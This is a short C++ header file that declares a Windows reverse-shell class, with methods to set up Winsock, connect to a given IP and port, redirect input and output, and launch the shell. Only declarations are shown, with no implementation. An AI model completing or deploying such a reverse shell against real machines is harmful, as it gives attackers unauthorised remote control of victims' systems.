#ifndef SHELL_H
#define SHELL_H

#include <string>
#include <winsock2.h>

class Shell {
    private:
        std::string _ip;
        int _port;
        SOCKET _socket;
        bool _initialized;

        bool initializeWinsock();
        SOCKET createSocket();
        bool connectToServer();
        void setupRedirection();

    public:
        Shell(const std::string& ip, int port);
        ~Shell();

        bool connect();
        void launchReverseShell();
};

#endif